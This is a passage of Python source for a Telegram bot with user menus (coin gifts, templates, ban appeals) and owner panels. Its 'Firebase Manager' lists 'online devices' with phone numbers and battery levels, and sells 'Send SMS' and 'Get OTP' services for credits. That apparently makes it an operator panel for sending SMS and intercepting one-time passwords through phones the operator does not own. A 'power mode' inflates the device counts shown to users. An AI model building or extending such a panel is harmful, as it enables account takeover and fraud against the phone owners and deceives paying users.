async def gift_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "gift")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Gift Coins</b>\n\n"
        f"Send coins to a friend (one-way, no return).\n\nTap to continue.",
        kb([
            (sc("continue"), "user:gift:start"),
            (sc("back"), "user:home"),
        ]),
    )

@R.callback_query(F.data == "user:gift:start")
async def gift_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    cur = get_user_coins(uid, d)
    if cur < 1:
        try:
            await cq.answer("❌ No coins!")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.gift_coins_uid)
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Gift Coins</b>\n\n"
        f"Your coins: <b>{cur}</b>\n\nTarget user ID:",
        kb([(sc("cancel"), "user:home")]),
    )

@R.message(S.gift_coins_uid)
async def gift_uid(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        t = int((m.text or "").strip())
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID.", parse_mode="HTML")
        return
    if t == uid:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Cannot self.", parse_mode="HTML")
        return
    if str(t) not in d.get("users", {}):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Not found.", parse_mode="HTML")
        return
    await state.update_data(gift_target=t)
    await state.set_state(S.gift_coins_amount)
    await m.answer(f"Target: <code>{t}</code>\n\nAmount to gift:", parse_mode="HTML")

@R.message(S.gift_coins_amount)
async def gift_amt(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        a = int((m.text or "").strip())
        if a <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    t = fsmd.get("gift_target")
    cur = get_user_coins(uid, d)
    if a > cur:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Max {cur}!", parse_mode="HTML")
        return
    if not deduct_coins(uid, a, d, "gift-out"):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient.", parse_mode="HTML")
        return
    add_coins(t, a, d, False, "gift-in")
    save()
    await state.clear()
    try:
        await m.bot.send_message(t, f"🎁 <b>+{a} coins gift from {uid}</b>", parse_mode="HTML")
    except Exception:
        pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Gifted {a} coins to <code>{t}</code>.",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

# ============================================================
#  USER VIDEO (FIXED — no more double answer)
# ============================================================
@R.callback_query(F.data == "user:random_video")
async def user_vid(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "videos")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    vids = d.get("videos", [])
    if not vids:
        try:
            await cq.answer("❌ No videos yet!", show_alert=True)
        except Exception:
            pass
        return
    vid = random.choice(vids)
    try:
        await cq.answer("📹 Sending...")
    except Exception:
        pass
    try:
        if isinstance(vid, str) and vid.startswith("http"):
            await cq.message.answer_video(vid, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!")
        else:
            await cq.message.answer_video(vid, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!")
    except Exception as e:
        try:
            await cq.message.answer(f"❌ Send failed: {esc(str(e)[:80])}", parse_mode="HTML")
        except Exception:
            pass

# ============================================================
#  USER TEMPLATES
# ============================================================
@R.callback_query(F.data == "user:templates:menu")
async def user_templates_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "templates")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    tpls = d.get("templates", {}).get(str(uid), [])
    rows = []
    for i, t in enumerate(tpls[:8]):
        rows.append([btn(t.get("name", f"tpl{i}")[:22], f"user:tpl:use:{i}", EMOJI_FILE, "📝")])
    rows.append([btn("new template", "user:tpl:new", EMOJI_PLUS, "➕")])
    rows.append([btn("back", "user:home", EMOJI_GEAR, "🔙")])
    txt = f"{em(EMOJI_FILE, '📝')} <b>Templates</b>\n\nTotal: <b>{len(tpls)}</b>"
    if not tpls:
        txt += "\n\n<i>No templates yet.</i>"
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "user:tpl:new")
async def user_tpl_new(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.template_name)
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📝')} <b>New Template</b>\n\nName:",
        kb([(sc("cancel"), "user:templates:menu")]),
    )

@R.message(S.template_name)
async def tpl_name(m: Message, state: FSMContext):
    name = (m.text or "").strip()[:40]
    if not name:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    await state.update_data(tpl_name=name)
    await state.set_state(S.template_text)
    await m.answer(f"Name saved: <b>{esc(name)}</b>\n\nEnter template text:", parse_mode="HTML")

@R.message(S.template_text)
async def tpl_text(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    txt = (m.text or "").strip()[:500]
    if not txt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    name = fsmd.get("tpl_name", "tpl")
    await state.clear()
    d.setdefault("templates", {}).setdefault(str(uid), []).append({
        "name": name,
        "text": txt,
        "created_at": now_ts(),
    })
    save()
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Template saved: <b>{esc(name)}</b>",
        reply_markup=kb([(sc("templates"), "user:templates:menu")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data.regexp(r"^user:tpl:use:(\d+)$"))
async def user_tpl_use(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    i = int(cq.data.split(":")[-1])
    tpls = d.get("templates", {}).get(str(uid), [])
    if i >= len(tpls):
        return
    tpl = tpls[i]
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📝')} <b>Template</b>\n\n"
        f"<b>{esc(tpl['name'])}</b>\n\n"
        f"<code>{esc(tpl['text'])}</code>",
        kb([(sc("back"), "user:templates:menu")]),
    )

# ============================================================
#  APPEAL (ban)
# ============================================================
@R.callback_query(F.data == "user:appeal")
async def user_appeal(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.direct_msg_text)
    await state.update_data(appeal=True)
    await safe_edit(
        cq,
        f"{em(EMOJI_USER, '🔓')} <b>Appeal Ban</b>\n\n"
        f"Explain why you should be unbanned:",
        kb([(sc("cancel"), "user:home")]),
    )

@R.message(S.direct_msg_text)
async def dm_receiver(m: Message, state: FSMContext):
    fsmd = await state.get_data()
    txt = (m.text or "").strip()
    if not txt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    uid = m.from_user.id
    uname = m.from_user.full_name or "User"
    is_appeal = fsmd.get("appeal")
    await state.clear()

    if is_appeal:
        d = load()
        appeal = {
            "uid": uid,
            "name": uname,
            "text": txt[:1000],
            "ts": now_ts(),
            "status": "open",
        }
        d.setdefault("appeals", []).append(appeal)
        save()
        try:
            await m.bot.send_message(MAIN_OWNER, (
                f"{em(EMOJI_USER, '🔓')} <b>Ban Appeal</b>\n\n"
                f"👤 {esc(uname)}\n"
                f"🆔 <code>{uid}</code>\n\n"
                f"💬 {esc(txt[:500])}"
            ), parse_mode="HTML")
        except Exception:
            pass
        await m.answer(f"{em(EMOJI_CHECK, '✅')} Appeal sent!", reply_markup=kb([(sc("home"), "user:home")]), parse_mode="HTML")
        return

    await m.answer(f"{em(EMOJI_CROSS, '❌')} Unknown message.", parse_mode="HTML")

# ═══════════════════════════════════════════════════════════
#  END OF PART 6 — paste PART 7 after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 7 — OWNER FLOWS PART 1
#  firebase manager • credits/coins • owners/admins
#  ban/unban • force join • limits • protected
# ============================================================

# ============================================================
#  POWER MODE
# ============================================================
@R.callback_query(F.data.startswith("owner:set_power:"))
async def set_power(cq: CallbackQuery, state: FSMContext):
    global CURRENT_POWER_MODE, LAST_KNOWN_DEVICE_COUNT
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        mult = int(cq.data.split("owner:set_power:", 1)[1])
        if mult not in ALLOWED_POWER_MODES:
            raise ValueError
    except Exception:
        try:
            await cq.answer("❌ Invalid")
        except Exception:
            pass
        return
    CURRENT_POWER_MODE = mult
    real = len(CACHED_DEVICES)
    if real > 0:
        LAST_KNOWN_DEVICE_COUNT = real * mult
    try:
        await cq.answer(f"⚡ Power: {mult}x")
    except Exception:
        pass
    log_audit(d, "power_change", cq.from_user.id, f"{mult}x")
    save()
    await safe_edit(cq, owner_panel_text(d), owner_kb(d))
    uid = cq.from_user.id
    _OWNER_PANEL_STATE[uid] = {
        "chat_id": cq.message.chat.id,
        "msg_id": cq.message.message_id,
        "active": True,
        "last_user_action": time.time(),
    }

# ============================================================
#  MAINTENANCE TOGGLE (global)
# ============================================================
@R.callback_query(F.data == "owner:toggle_maint")
async def maint_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    cur = d.setdefault("settings", {}).get("maintenance", False)
    d["settings"]["maintenance"] = not cur
    log_audit(d, "maint_toggle", cq.from_user.id, f"{d['settings']['maintenance']}")
    save()
    try:
        await cq.answer(f"🔧 {'ON' if d['settings']['maintenance'] else 'OFF'}")
    except Exception:
        pass
    await safe_edit(cq, owner_panel_text(d), owner_kb(d))

# ============================================================
#  SERVICE MAINTENANCE — TOGGLE PER SERVICE
# ============================================================
@R.callback_query(F.data == "owner:maint:menu")
async def maint_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    svc = d.get("settings", {}).get("maintenance_services", {})
    down = sum(1 for v in svc.values() if v)
    await safe_edit(
        cq,
        f"{em(EMOJI_GEAR, '🔧')} <b>Service Maintenance</b>\n\n"
        f"Down services: <b>{down}</b>\n\n"
        f"Tap a service to toggle its maintenance state.\n"
        f"When DOWN, users see a message when they try the service. "
        f"Owner/admin can still use it.",
        maint_menu_kb(d),
    )

@R.callback_query(F.data.startswith("owner:maint:toggle:"))
async def maint_toggle_service(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    service = cq.data.split(":", 3)[3]
    if service not in SERVICE_KEYS:
        try:
            await cq.answer("❌ Invalid")
        except Exception:
            pass
        return
    svc = d.setdefault("settings", {}).setdefault("maintenance_services", {})
    svc[service] = not svc.get(service, False)
    log_audit(d, "service_maint_toggle", cq.from_user.id, f"{service}={svc[service]}")
    save()
    try:
        await cq.answer(f"{'🔴 DOWN' if svc[service] else '🟢 UP'}: {service}")
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_GEAR, '🔧')} <b>Service Maintenance</b>\n\n"
        f"Tap a service to toggle:\n\n"
        f"<i>Tip: 'edit service msg' se custom message set kar sakte ho.</i>",
        maint_menu_kb(d),
    )

@R.callback_query(F.data == "owner:maint:msglist")
async def maint_msglist(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    rows = []
    labels = {
        "send_sms": "📤 Send SMS",
        "get_otp": "🔐 Get OTP",
        "wallet": "💳 Wallet",
        "redeem": "🎁 Redeem",
        "refer": "👥 Refer",
        "transfer": "💸 Transfer",
        "daily_bonus": "🎁 Daily Bonus",
        "pricing": "💰 Pricing",
        "videos": "📹 Videos",
        "support": "📩 Support",
        "gift": "🎁 Gift",
        "upcoming": "🔮 Coming Soon",
        "templates": "📝 Templates",
    }
    for key in SERVICE_KEYS:
        cur = d.get("settings", {}).get("maintenance_msg_service", {}).get(key)
        mark = "✏️" if cur else "➕"
        rows.append([btn(f"{mark} {labels.get(key, key)}", f"owner:maint:msgset:{key}", EMOJI_FILE, "📝")])
    rows.append([btn("back", "owner:maint:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📝')} <b>Service Messages</b>\n\n"
        f"Set custom maintenance message per service.\n"
        f"If not set, global maintenance message is used.",
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

@R.callback_query(F.data.startswith("owner:maint:msgset:"))
async def maint_msgset(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    service = cq.data.split(":", 3)[3]
    await state.update_data(maint_service=service)
    await state.set_state(S.set_service_maint_msg)
    try:
        await cq.answer()
    except Exception:
        pass
    cur = d.get("settings", {}).get("maintenance_msg_service", {}).get(service) or "<i>(not set — using global)</i>"
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📝')} <b>Service message: {esc(service)}</b>\n\n"
        f"Current: {cur}\n\n"
        f"Send new message (or <code>clear</code> to reset):",
        kb([(sc("cancel"), "owner:maint:msglist")]),
    )

@R.message(S.set_service_maint_msg)
async def maint_msgset_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    service = fsmd.get("maint_service")
    txt = (m.text or "").strip()[:300]
    await state.clear()
    if not service:
        await m.answer("❌ Expired.", parse_mode="HTML")
        return
    msgs = d.setdefault("settings", {}).setdefault("maintenance_msg_service", {})
    if txt.lower() in ("clear", "remove", "reset", "none", "-"):
        msgs.pop(service, None)
        save()
        await m.answer(
            f"✅ Cleared for <code>{esc(service)}</code>.",
            reply_markup=owner_kb(d),
            parse_mode="HTML",
        )
        return
    msgs[service] = txt
    save()
    await m.answer(
        f"✅ Set for <code>{esc(service)}</code>:\n{esc(txt)}",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

# ============================================================
#  EDIT OWNER NAME
# ============================================================
@R.callback_query(F.data == "owner:edit_name")
async def edit_name_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.owner_edit_name)
    cur = get_owner_display(d) or "<i>(hidden)</i>"
    await safe_edit(
        cq,
        f"{em(EMOJI_CROWN, '✏️')} <b>Edit Owner Name</b>\n\n"
        f"Current: <b>{cur}</b>\n\n"
        f"• Send text → set\n"
        f"• Send <code>null</code> → hide\n"
        f"• Send <code>cancel</code> → back",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.owner_edit_name)
async def edit_name_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    raw = (m.text or "").strip()
    low = raw.lower()
    if low in ("cancel", "/cancel"):
        await state.clear()
        await m.answer("❌ Cancelled.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if low in ("null", "none", "hide", "-", "0"):
        d.setdefault("settings", {})["owner_display"] = None
        save()
        await state.clear()
        await m.answer(f"✅ <b>Hidden!</b>", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if not raw:
        await m.answer(f"❌ Use <code>null</code> to hide.", parse_mode="HTML")
        return
    val = raw[:64]
    d.setdefault("settings", {})["owner_display"] = val
    log_audit(d, "owner_name_change", m.from_user.id, val)
    save()
    await state.clear()
    await m.answer(f"✅ Updated: <b>{esc(val)}</b>", reply_markup=owner_kb(d), parse_mode="HTML")

# ============================================================
#  FIREBASE MENU — OWNER
# ============================================================
@R.callback_query(F.data.startswith("owner:fb:menu"))
async def fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    await state.clear()
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    fbs = d.get("firebases", [])
    txt = (
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
        f"Total: <b>{len(fbs)}</b>\n"
        f"Online: <b>{len(CACHED_DEVICES)}</b> devices\n"
        f"Errors: <b>{len(FB_SCAN_ERRORS)}</b>\n\n"
        f"<i>Tap ➕ add firebase — text, file, txt, json, csv, all types accepted. "
        f"URLs auto-detected with per-URL report.</i>"
    )
    await safe_edit(cq, txt, fb_menu_owner_kb(d, page))

# ============================================================
#  FIREBASE ADD — UNIFIED (text + file)
# ============================================================
@R.callback_query(F.data == "owner:fb:add")
async def fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_firebase)
    await safe_edit(
        cq,
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase — text OR file</b>\n\n"
        f"<b>Text options:</b>\n"
        f"• <code>URL</code>\n"
        f"• <code>Label | URL</code>\n"
        f"• Multiple URLs (one per line)\n"
        f"• Mixed text with URLs\n\n"
        f"<b>File options:</b>\n"
        f"• Any file type (txt, json, csv, html, xml, log, ...)\n"
        f"• Auto URL detect\n"
        f"• Multi-file: send up to {_FB_IMPORT_MAX_FILES} files in 3s — processed together\n"
        f"• Per-file size cap: {_FB_IMPORT_MAX_BYTES // 1024 // 1024}MB\n\n"
        f"<i>Every URL is validated. Full report sent after processing.</i>",
        kb([(sc("cancel"), "owner:fb:menu:0")]),
    )

@R.message(S.add_firebase, F.document)
async def fb_add_file_doc(m: Message, state: FSMContext):
    """Handle document upload in firebase add state."""
    d = load()
    uid = m.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    doc = m.document
    ok, err = validate_upload_file(doc)
    if not ok:
        await m.answer(f"❌ {esc(err)}", parse_mode="HTML")
        return

    fname = doc.file_name or f"file_{int(time.time())}"
    content = ""
    try:
        fi = await m.bot.get_file(doc.file_id)
        downloaded = await m.bot.download_file(fi.file_path)
        raw = downloaded.read() if hasattr(downloaded, "read") else downloaded
        if isinstance(raw, (bytes, bytearray)):
            content = raw.decode("utf-8", errors="ignore")
        else:
            content = str(raw)
    except Exception as e:
        await m.answer(f"❌ Read failed: {esc(str(e)[:100])}", parse_mode="HTML")
        return

    # push to buffer for batch
    _fb_buffer_push(uid, m.chat.id, fname, content)
    b = _fb_buffer_get(uid)
    if len(b["files"]) > _FB_IMPORT_MAX_FILES:
        b["files"] = b["files"][-_FB_IMPORT_MAX_FILES:]

    urls_in_file = extract_urls(content)

    try:
        await m.answer(
            f"{em(EMOJI_FILE, '📄')} <b>File received</b>\n"
            f"📛 <code>{esc(fname[:40])}</code>\n"
            f"📦 {len(content)} bytes\n"
            f"🔗 URLs found: <b>{len(urls_in_file)}</b>\n\n"
            f"📁 Queue: <b>{len(b['files'])}</b>/{_FB_IMPORT_MAX_FILES}\n"
            f"<i>Send more files, or wait 3s — bot will process automatically.</i>",
            parse_mode="HTML",
        )
    except Exception:
        pass

    b["task"] = asyncio.create_task(_fb_batch_flush(m.bot, uid))

@R.message(S.add_firebase, F.text)
async def fb_add_text(m: Message, state: FSMContext):
    """Handle text (URL or Label|URL or multi-URL) in firebase add state."""
    d = load()
    uid = m.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    raw = (m.text or "").strip()
    if not raw or raw.lower() in ("cancel", "/cancel"):
        await state.clear()
        await m.answer("❌ Cancelled.", reply_markup=owner_kb(d), parse_mode="HTML")
        return

    urls = extract_urls(raw)
    if not urls:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} No URL detected.\n\n"
            f"Send a URL, or upload a file with URLs.",
            parse_mode="HTML",
            reply_markup=kb([(sc("cancel"), "owner:fb:menu:0")]),
        )
        return

    # push as text entry into buffer
    _fb_buffer_push(uid, m.chat.id, f"text_{int(time.time())}", raw)
    b = _fb_buffer_get(uid)

    try:
        await m.answer(
            f"{em(EMOJI_FILE, '📝')} <b>Text added</b>\n"
            f"🔗 URLs found: <b>{len(urls)}</b>\n"
            f"📁 Queue: <b>{len(b['files'])}</b>/{_FB_IMPORT_MAX_FILES}\n\n"
            f"<i>Processing in 3s…</i>",
            parse_mode="HTML",
        )
    except Exception:
        pass

    b["task"] = asyncio.create_task(_fb_batch_flush(m.bot, uid))

@R.message(S.add_firebase)
async def fb_add_other(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    await m.answer(
        f"❌ Send text with URLs or upload a file (any type).",
        parse_mode="HTML",
    )

# ============================================================
#  FIREBASE ADD — multi-file explicit button (same state, just info)
# ============================================================
@R.callback_query(F.data == "owner:fb:add_multi")
async def fb_add_multi_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_firebase)
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📁')} <b>Bulk Import</b>\n\n"
        f"Send up to <b>{_FB_IMPORT_MAX_FILES}</b> files in a row (within 3s of each other).\n"
        f"All files are collected, then processed together.\n\n"
        f"📦 Per-file cap: {_FB_IMPORT_MAX_BYTES // 1024 // 1024}MB\n"
        f"🔍 URLs auto-extracted from every file\n"
        f"✅ Full per-URL report at end",
        kb([(sc("cancel"), "owner:fb:menu:0")]),
    )

# ============================================================
#  FIREBASE DELETE
# ============================================================
@R.callback_query(F.data.startswith("owner:fb:del:"))
async def fb_del(cq: CallbackQuery, state: FSMContext):
    global CACHED_DEVICES, FB_DEVICE_COUNTS, LAST_KNOWN_FB_COUNTS
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    parts = cq.data.split(":")
    fid = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0
    before = len(d.get("firebases", []))
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fid]
    after = len(d["firebases"])
    log_audit(d, "fb_del", cq.from_user.id, fid)
    save()
    CACHED_DEVICES = [x for x in CACHED_DEVICES if x.get("fb_id") != fid]
    FB_DEVICE_COUNTS.pop(fid, None)
    LAST_KNOWN_FB_COUNTS.pop(fid, None)
    FB_SCAN_ERRORS.pop(fid, None)
    try:
        await cq.answer(f"🗑 Removed ({before} → {after})")
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
        f"Total: <b>{len(d['firebases'])}</b>",
        fb_menu_owner_kb(d, page),
    )

# ============================================================
#  FIREBASE HEALTH
# ============================================================
@R.callback_query(F.data == "owner:fbhealth")
async def fb_health(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    txt = _firebase_health_text(d)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(
        cq,
        txt,
        kb([
            (sc("refresh"), "owner:fbhealth"),
            (sc("back"), "owner:home"),
        ]),
    )

# ============================================================
#  ADMIN FIREBASE VIEW (masked)
# ============================================================
@R.callback_query(F.data.startswith("admin:fb:menu"))
async def admin_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    fbs = d.get("firebases", [])
    txt = (
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebases (masked)</b>\n\n"
        f"Total: <b>{len(fbs)}</b>\n\n"
        f"<i>URLs are hidden. View device info per firebase.</i>"
    )
    await safe_edit(cq, txt, fb_menu_admin_kb(d, page))

@R.callback_query(F.data.startswith("admin:fb:view:"))
async def admin_fb_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    fid = cq.data.split(":", 3)[3]
    fbs = d.get("firebases", [])
    idx = None
    for i, fb in enumerate(fbs):
        if fb["id"] == fid:
            idx = i
            break
    if idx is None:
        try:
            await cq.answer("❌ Gone")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass

    online_devs = [x for x in CACHED_DEVICES if x.get("fb_id") == fid]
    err = FB_SCAN_ERRORS.get(fid, "none")
    lines = [
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase {idx + 1}</b>\n",
        f"📱 Online devices: <b>{len(online_devs)}</b>",
        f"🔢 Power mode: <b>{CURRENT_POWER_MODE}x</b>",
        f"⚠️ Last error: <code>{esc(str(err)[:60])}</code>",
        "",
    ]
    for i, dv in enumerate(online_devs[:20], 1):
        nm = esc(str(dv.get("dev_name", "?"))[:24])
        ph = dv.get("phone") or "no number"
        bat = dv.get("battery")
        bat_s = f" · 🔋{bat}%" if bat is not None else ""
        lines.append(f"{i}. 📱 {nm} — <code>{esc(ph)}</code>{bat_s}")
    if len(online_devs) > 20:
        lines.append(f"<i>+{len(online_devs) - 20} more</i>")

    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(
        cq, txt,
        kb([
            (sc("refresh"), f"admin:fb:view:{fid}"),
            (sc("back"), "admin:fb:menu:0"),
        ]),
    )

# ============================================================
#  API STATS (owner / admin)
# ============================================================
def _api_stats(d):
    stats = d.get("stats", {})
    api = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [
        f"{em(EMOJI_CHART, '📊')} <b>API Stats</b>\n",
        f"📤 Sent: <b>{stats.get('total_sent', 0)}</b>",
        f"❌ Failed: <b>{stats.get('total_failed', 0)}</b>",
        f"🔐 OTP Fetches: <b>{stats.get('otp_fetches', 0)}</b>",
        f"♻️ OTP Refunds: <b>{stats.get('otp_refunds', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━━━",
    ]
    if not api:
        lines.append("  😴 No usage.")
    for fid, s in list(api.items())[:20]:
        fb = fbs.get(fid)
        lbl = esc(fb.get("label", fid[:20]) if fb else fid[:20])
        lines.append(
            f"🔥 {lbl}\n"
            f"   ✅ {s.get('sent', 0)} | ❌ {s.get('failed', 0)}"
        )
    return "\n".join(lines)

@R.callback_query(F.data.in_({"owner:stats", "admin:stats"}))
async def stats_any(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    is_o = is_owner(uid, d)
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer("⏳")
    except Exception:
        pass
    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(d)
        except Exception:
            devices = []
    txt = _api_stats(d)
    dl = [f"\n{em(EMOJI_CHECK, '🟢')} <b>APIs ({len(devices) * CURRENT_POWER_MODE})</b>\n"]
    if not devices:
        dl.append("  😴 None")
    for dv in devices[:30]:
        dl.append(
            f"  📱 {esc(str(dv.get('dev_name', ''))[:20])} — "
            f"🔥 {esc(str(dv.get('fb_label', ''))[:20])}"
        )
    if len(devices) > 30:
        dl.append(f"  ...+{len(devices) - 30}")
    full = txt + "\n" + "\n".join(dl)
    if len(full) > 4000:
        full = full[:3990] + "\n<i>...</i>"
    back = "owner:home" if is_o else "admin:home"
    prefix = "owner" if is_o else "admin"
    await safe_edit(
        cq,
        full,
        kb([
            (sc("refresh"), f"{prefix}:stats"),
            (sc("back"), back),
        ]),
    )

# ============================================================
#  USERS LIST
# ============================================================
def _users_list(d, prefix, page=0):
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    appr = d.get("approved", [])
    ban = d.get("banned", [])
    lines = [f"{em(EMOJI_USER, '👥')} <b>Users ({len(items)})</b>\n"]
    for us, ud in chunk:
        uid = int(us)
        nm = esc(str(ud.get("name", "?"))[:16])
        st = "🚫" if uid in ban else "✅" if uid in appr else "👑" if is_owner(uid, d) else "🛡" if uid in d.get("admins", []) else "👤"
        lines.append(
            f"{st} <b>{nm}</b> — 💰{ud.get('credits', 0)} "
            f"🪙{ud.get('coins', 0)} 📤{ud.get('uses', 0)}"
        )
    rows = []
    for us, ud in chunk:
        uid = int(us)
        nm = str(ud.get("name", "?"))[:22]
        rows.append([btn(f"{nm} • {uid}", f"{prefix}:user:view:{uid}", EMOJI_USER, "👤")])
    nav = []
    if page > 0:
        nav.append(btn("prev", f"{prefix}:users:pg:{page - 1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items):
        nav.append(btn("next", f"{prefix}:users:pg:{page + 1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
